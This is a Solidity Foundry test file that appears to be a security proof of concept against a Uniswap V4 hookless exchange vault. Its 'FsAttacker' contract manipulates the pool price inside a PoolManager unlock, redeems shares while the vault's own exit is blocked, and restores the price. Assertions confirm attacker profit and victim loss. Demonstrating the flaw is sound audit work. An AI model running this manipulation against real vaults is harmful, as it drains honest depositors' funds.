// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import {console2} from "forge-std/console2.sol";
import {TestBase_UniswapV4FullSpreadHooklessStandardExchangeVault} from
    "contracts/vaults/standard/exchange/protocols/uniswap/v4/fullSpread/hookless/test/bases/TestBase_UniswapV4FullSpreadHooklessStandardExchangeVault.sol";
import {ERC20PermitMintableStub} from "@crane/contracts/tokens/ERC20/ERC20PermitMintableStub.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {Math} from "@crane/contracts/utils/Math.sol";
import {IPoolManager} from "@crane/contracts/protocols/dexes/uniswap/v4/interfaces/IPoolManager.sol";
import {IUnlockCallback} from "@crane/contracts/protocols/dexes/uniswap/v4/interfaces/callback/IUnlockCallback.sol";
import {IHooks} from "@crane/contracts/protocols/dexes/uniswap/v4/interfaces/IHooks.sol";
import {PoolKey} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolKey.sol";
import {PoolId, PoolIdLibrary} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolId.sol";
import {Currency} from "@crane/contracts/protocols/dexes/uniswap/v4/types/Currency.sol";
import {BalanceDelta, BalanceDeltaLibrary} from "@crane/contracts/protocols/dexes/uniswap/v4/types/BalanceDelta.sol";
import {ModifyLiquidityParams, SwapParams} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolOperation.sol";
import {TickMath} from "@crane/contracts/protocols/dexes/uniswap/v4/libraries/TickMath.sol";
import {StateLibrary} from "@crane/contracts/protocols/dexes/uniswap/v4/libraries/StateLibrary.sol";
import {IStandardExchangeProxy} from "contracts/interfaces/proxies/IStandardExchangeProxy.sol";
import {IStandardExchangeInMulti} from "contracts/interfaces/IStandardExchangeInMulti.sol";
import {IStandardExchangeOutMulti} from "contracts/interfaces/IStandardExchangeOutMulti.sol";

interface IFsReserve {
    function deployedReserve() external view returns (uint256, uint256);
    function canOpenPoolManagerUnlock() external view returns (bool);
}

/// Unprivileged attacker: holds shares bought at fair price, runs one PM.unlock.
contract FsAttacker is IUnlockCallback {
    using BalanceDeltaLibrary for BalanceDelta;
    IPoolManager immutable pm;
    PoolKey key;
    IStandardExchangeProxy immutable vault;
    IERC20 immutable t0;
    IERC20 immutable t1;
    uint160 public pushTo;
    uint160 public restoreTo;
    bool public dual;
    uint256 public payout0;
    uint256 public payout1;

    constructor(IPoolManager pm_, PoolKey memory key_, IStandardExchangeProxy v_, IERC20 a, IERC20 b) {
        pm = pm_; key = key_; vault = v_; t0 = a; t1 = b;
        a.approve(address(v_), type(uint256).max); b.approve(address(v_), type(uint256).max);
    }

    function deposit(uint256 a0, uint256 a1) external returns (uint256 shares) {
        address[] memory toks = new address[](2); toks[0] = address(t0); toks[1] = address(t1);
        uint256[] memory amts = new uint256[](2); amts[0] = a0; amts[1] = a1;
        shares = IStandardExchangeInMulti(address(vault)).exchangeInManyToOne(
            toks, amts, IERC20(address(vault)), 0, address(this), false, block.timestamp);
    }

    function attack(uint160 pushTo_, uint160 restoreTo_, bool dual_) external {
        pushTo = pushTo_; restoreTo = restoreTo_; dual = dual_;
        pm.unlock("");
    }

    function _earned() internal view returns (uint256 e0, uint256 e1) {
        PoolId id = PoolIdLibrary.toId(key);
        int24 lo = TickMath.minUsableTick(key.tickSpacing); int24 hi = TickMath.maxUsableTick(key.tickSpacing);
        (uint128 lv, uint256 l0, uint256 l1) = StateLibrary.getPositionInfo(pm, id, address(vault), lo, hi, bytes32(0));
        require(lv > 0, "vault position ticks");
        (uint256 g0, uint256 g1) = StateLibrary.getFeeGrowthInside(pm, id, lo, hi);
        unchecked { e0 = Math.mulDiv(g0 - l0, lv, 1 << 128); e1 = Math.mulDiv(g1 - l1, lv, 1 << 128); }
    }

    function _totals() internal view returns (uint256[3] memory t) {
        (uint256 dep0, uint256 dep1) = IFsReserve(address(vault)).deployedReserve();
        (uint256 e0, uint256 e1) = _earned();
        t[0] = dep0 + t0.balanceOf(address(vault)) + e0;
        t[1] = dep1 + t1.balanceOf(address(vault)) + e1;
        t[2] = vault.totalSupply();
    }

    function _amountsFor(uint256 s_, uint256[3] memory t) internal pure returns (bool ok, uint256[] memory amts) {
        amts = new uint256[](2);
        amts[1] = Math.mulDiv(s_, t[1], t[2]);
        if (Math.mulDiv(amts[1], t[2], t[1], Math.Rounding.Ceil) != s_) return (false, amts);
        amts[0] = Math.mulDiv(s_, t[0], t[2]);
        ok = true;
    }

    function _dualExit(uint256 shares) internal {
        uint256[3] memory t = _totals();
        address[] memory toks = new address[](2); toks[0] = address(t0); toks[1] = address(t1);
        for (uint256 k; k < 64; ++k) {
            (bool ok, uint256[] memory amts) = _amountsFor(shares - k, t);
            if (!ok) continue;
            try IStandardExchangeOutMulti(address(vault)).previewExchangeOutOneToMany(IERC20(address(vault)), toks, amts) returns (uint256) {
                IStandardExchangeOutMulti(address(vault)).exchangeOutOneToMany(
                    IERC20(address(vault)), shares, toks, amts, address(this), false, block.timestamp);
                payout0 = amts[0]; payout1 = amts[1];
                return;
            } catch {}
        }
        revert("no s0==s1 amounts found");
    }

    function unlockCallback(bytes calldata) external returns (bytes memory) {
        require(msg.sender == address(pm));
        // (a) push price down: sell token0 (token0 becomes cheap in pool terms -> other leg expensive)
        BalanceDelta d = pm.swap(key, SwapParams(true, -int256(1e36), pushTo), "");
        int256 n0 = d.amount0(); int256 n1 = d.amount1();
        // (b) blocked exit from the vault (PM is unlocked by us -> vault cannot open its own unlock)
        uint256 shares = vault.balanceOf(address(this));
        if (!dual) {payout0 = vault.exchangeIn(IERC20(address(vault)), shares, t0, 0, address(this), false, block.timestamp);
        } else {
            _dualExit(shares);
        }
        // (c) restore price exactly to the original sqrtP
        d = pm.swap(key, SwapParams(false, -int256(1e36), restoreTo), "");
        n0 += d.amount0(); n1 += d.amount1();
        // (d) remaining token1 debt (swap fees) bought with token0 via a tiny exact-output swap
        if (n1 < 0 && uint256(-n1) > t1.balanceOf(address(this))) {
            d = pm.swap(key, SwapParams(true, int256(-n1), TickMath.MIN_SQRT_PRICE + 1), "");
            n0 += d.amount0(); n1 += d.amount1();
        }
        _settle(key.currency0, n0);
        _settle(key.currency1, n1);
        return "";
    }

    function _settle(Currency c, int256 d) internal {
        if (d < 0) {
            pm.sync(c);
            IERC20(Currency.unwrap(c)).transfer(address(pm), uint256(-d));
            pm.settle();
        } else if (d > 0) {
            pm.take(c, address(this), uint256(d));
        }
    }

    function redeemAll() external returns (uint256) {return vault.exchangeIn(IERC20(address(vault)), vault.balanceOf(address(this)), t0, 0, address(this), false, block.timestamp);
    }
}

contract FsBlockedExitSleeveTest is TestBase_UniswapV4FullSpreadHooklessStandardExchangeVault, IUnlockCallback {
    using BalanceDeltaLibrary for BalanceDelta;
    using PoolIdLibrary for PoolKey;

    IStandardExchangeProxy internal vault;
    PoolKey internal poolKey;
    IERC20 internal token0;
    IERC20 internal token1;
    FsAttacker internal attacker;
    uint160 internal sqrtP0;
    bool internal expectNoProfit;

    // parameters (18/18 decimals, price 1:1, 0.3% fee tier as in project fixtures)
    function _extLiq() internal pure virtual returns (uint128) { return 2_000e18; } // independent external full-range LP
    uint256 internal constant VICTIM_DEPOSIT = 10_000e18; // honest vault depositor, each token
    uint256 internal constant ATTACKER_DEPOSIT = 300e18;  // attacker fair deposit, each token

    function setUp() public virtual override {
        super.setUp();
        ERC20PermitMintableStub a = new ERC20PermitMintableStub("Pair A", "A", 18, address(this), 1e32);
        ERC20PermitMintableStub b = new ERC20PermitMintableStub("Pair B", "B", 18, address(this), 1e32);
        bool ordered = address(a) < address(b);
        token0 = IERC20(ordered ? address(a) : address(b));
        token1 = IERC20(ordered ? address(b) : address(a));
        poolKey = PoolKey(Currency.wrap(address(token0)), Currency.wrap(address(token1)), 3_000, 60, IHooks(address(0)));
        sqrtP0 = uint160(1 << 96);
        poolManager.initialize(poolKey, sqrtP0);
        poolManager.unlock(abi.encode(_extLiq()));
        vault = IStandardExchangeProxy(uniswapV4StandardExchangeDFPkg.deployVault(poolKey));
        token0.approve(address(vault), type(uint256).max);
        token1.approve(address(vault), type(uint256).max);

        // honest victim deposit (this test contract is the victim LP)
        address[] memory toks = new address[](2); toks[0] = address(token0); toks[1] = address(token1);
        uint256[] memory amts = new uint256[](2); amts[0] = VICTIM_DEPOSIT; amts[1] = VICTIM_DEPOSIT;
        IStandardExchangeInMulti(address(vault)).exchangeInManyToOne(toks, amts, IERC20(address(vault)), 0, address(this), false, block.timestamp);

        attacker = new FsAttacker(poolManager, poolKey, vault, token0, token1);
        token0.transfer(address(attacker), ATTACKER_DEPOSIT);
        token1.transfer(address(attacker), ATTACKER_DEPOSIT);
        vm.prank(address(0xA77AC4E5), address(0xA77AC4E5));
        attacker.deposit(ATTACKER_DEPOSIT, ATTACKER_DEPOSIT);
        vm.roll(block.number + 1);
        vm.warp(block.timestamp + 12);
    }

    function unlockCallback(bytes calldata data_) external returns (bytes memory) {
        uint128 liq = abi.decode(data_, (uint128));
        (BalanceDelta delta,) = poolManager.modifyLiquidity(poolKey, ModifyLiquidityParams(
            TickMath.minUsableTick(60), TickMath.maxUsableTick(60), int256(uint256(liq)), bytes32(0)), "");
        if (delta.amount0() < 0) { poolManager.sync(poolKey.currency0); token0.transfer(address(poolManager), uint128(-delta.amount0())); poolManager.settle(); }
        if (delta.amount1() < 0) { poolManager.sync(poolKey.currency1); token1.transfer(address(poolManager), uint128(-delta.amount1())); poolManager.settle(); }
        return "";
    }

    // value in token0 units at fair price P0 (= 1.0 here, sqrtP0 = 2^96)
    function _v(uint256 a0, uint256 a1) internal view returns (uint256) {
        uint160 s = sqrtP0;
        return a0 + Math.mulDiv(Math.mulDiv(a1, 1 << 96, s), 1 << 96, s);
    }

    function _navPerShare() internal view returns (uint256) {
        (uint256 d0, uint256 d1) = IFsReserve(address(vault)).deployedReserve();
        (uint256 e0, uint256 e1) = _vaultEarned();
        uint256 tot = _v(d0 + e0 + token0.balanceOf(address(vault)), d1 + e1 + token1.balanceOf(address(vault)));
        return Math.mulDiv(tot, 1e18, vault.totalSupply());
    }

    // uncollected position fees owed to the vault (counted in NAV so swap fees the vault earns are credited to victims)
    function _vaultEarned() internal view returns (uint256 e0, uint256 e1) {
        PoolId id = poolKey.toId();
        int24 lo = TickMath.minUsableTick(60); int24 hi = TickMath.maxUsableTick(60);
        (uint128 lv, uint256 l0, uint256 l1) = StateLibrary.getPositionInfo(poolManager, id, address(vault), lo, hi, bytes32(0));
        (uint256 g0, uint256 g1) = StateLibrary.getFeeGrowthInside(poolManager, id, lo, hi);
        unchecked { e0 = Math.mulDiv(g0 - l0, lv, 1 << 128); e1 = Math.mulDiv(g1 - l1, lv, 1 << 128); }
    }

    function _logState(string memory tag) internal view {
        (uint256 d0, uint256 d1) = IFsReserve(address(vault)).deployedReserve();
        console2.log(tag);
        console2.log("  vault deployed0/1", d0, d1);
        console2.log("  vault free0/1", token0.balanceOf(address(vault)), token1.balanceOf(address(vault)));
        (uint256 e0, uint256 e1) = _vaultEarned();
        console2.log("  vault uncollected fees0/1", e0, e1);
        console2.log("  pool liquidity", StateLibrary.getLiquidity(poolManager, poolKey.toId()));
        console2.log("  supply / attackerShares", vault.totalSupply(), vault.balanceOf(address(attacker)));
        console2.log("  NAV/share (token0 @P0, 1e18)", _navPerShare());
    }

    struct R { uint256 attackerShares; uint256 victimShares; uint256 navBefore; uint256 cost; uint256 fairClaim;
        uint256 victimBefore; uint256 idleOut; uint256 b0; uint256 b1; uint256 g0; uint256 g1; uint256 finalValue; uint256 victimAfter; }

    function _run(uint256 rBps, bool dual) internal {
        _logState("== pre-attack");
        R memory r;
        r.attackerShares = vault.balanceOf(address(attacker));
        r.victimShares = vault.balanceOf(address(this));
        r.navBefore = _navPerShare();
        r.cost = _v(ATTACKER_DEPOSIT, ATTACKER_DEPOSIT);
        r.fairClaim = Math.mulDiv(r.attackerShares, r.navBefore, 1e18);
        r.victimBefore = Math.mulDiv(r.victimShares, r.navBefore, 1e18);
        uint256 snap = vm.snapshotState();
        vm.prank(address(0xA77AC4E5), address(0xA77AC4E5));
        r.idleOut = attacker.redeemAll();
        vm.revertToState(snap);
        console2.log("baseline idle redeem token0", r.idleOut);
        r.b0 = token0.balanceOf(address(attacker));
        r.b1 = token1.balanceOf(address(attacker));
        vm.prank(address(0xA77AC4E5), address(0xA77AC4E5));
        attacker.attack(uint160(uint256(sqrtP0) * 10_000 / rBps), sqrtP0, dual);
        (uint160 sAfter,,,) = StateLibrary.getSlot0(poolManager, poolKey.toId());
        assertApproxEqRel(sAfter, sqrtP0, 0.002e18, "price restored");
        console2.log("sqrtP before/after", sqrtP0, sAfter);
        r.g0 = token0.balanceOf(address(attacker)) - r.b0;
        r.g1 = token1.balanceOf(address(attacker)) - r.b1;
        console2.log("attacker vault payout0/payout1", attacker.payout0(), attacker.payout1());
        console2.log("attacker net received token0/token1 (after swap fees)", r.g0, r.g1);
        r.finalValue = _v(r.g0, r.g1);
        console2.log("attacker cost (fair deposit value, token0)", r.cost);
        console2.log("attacker fair claim pre-attack", r.fairClaim);
        console2.log("attacker final value @P0", r.finalValue);
        assertEq(vault.balanceOf(address(attacker)), 0);
        _logState("== post-attack");
        r.victimAfter = Math.mulDiv(r.victimShares, _navPerShare(), 1e18);
        console2.log("victim value before / after", r.victimBefore, r.victimAfter);
        if (r.finalValue > r.cost) console2.log("ATTACKER PROFIT vs cost", r.finalValue - r.cost);
        else console2.log("ATTACKER LOSS vs cost", r.cost - r.finalValue);
        if (r.finalValue > r.idleOut) console2.log("ATTACKER PROFIT vs idle redeem", r.finalValue - r.idleOut);
        if (r.victimBefore > r.victimAfter) console2.log("VICTIM LOSS", r.victimBefore - r.victimAfter);
        if (expectNoProfit) {
            // second-order AM-GM surplus does not cover round-trip fees when the vault is a minority of pool depth
            assertLt(r.finalValue, r.cost, "expected unprofitable");
            return;
        }
        assertGt(r.finalValue, r.cost, "attacker profit vs deposited capital");
        assertGt(r.finalValue, r.idleOut, "attacker beats honest redeem");
        assertLt(r.victimAfter, r.victimBefore, "victim NAV loss");
    }

    function test_zapRedeem_r130() public { _run(13_000, false); }
    function test_zapRedeem_r115() public { _run(11_500, false); }
    function test_zapRedeem_r105() public { _run(10_500, false); }
    function test_dualExit_r150() public virtual { _run(15_000, true); }
}

/// Same attack, vault is only ~30% of pool liquidity (external LP 20k L vs vault ~8.6k L).
contract FsBlockedExitSleeveDeepPoolTest is FsBlockedExitSleeveTest {
    function _extLiq() internal pure override returns (uint128) { return 20_000e18; }
    function test_dualExit_r150_unprofitable() public { expectNoProfit = true; _run(15_000, true); }
    function test_dualExit_r150() public override { expectNoProfit = true; _run(15_000, true); }
}
